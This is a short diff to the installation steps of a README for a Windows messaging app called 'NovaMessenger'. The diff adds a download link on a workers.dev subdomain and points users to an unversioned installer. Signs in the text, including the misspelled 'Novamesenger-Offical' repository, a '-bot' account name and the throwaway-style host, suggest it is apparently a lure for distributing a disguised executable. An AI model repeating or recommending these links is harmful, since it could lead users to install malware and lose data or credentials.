@@ -15,8 +15,8 @@ System Requirements
 - Experimental: Windows 7 or 8 or 8.1
 
 Installation
-1. Download the latest installer from the Releases page (https://github.com/annatkachuk259-bot/Novamesenger-Offical/releases) or the official website.
-2. Run NovaMessenger_Setup_v1.3.exe and follow the installation wizard.
+1. Download the latest installer from the Releases page (https://github.com/annatkachuk259-bot/Novamesenger-Offical/releases) or the official website.(https://novamesengeroffical.annatkachuk259.workers.dev/)
+2. Run NovaMessenger_Setup_.exe and follow the installation wizard.
 3. Launch NovaMessenger from your Desktop or Start Menu.
 
 Security and Verification
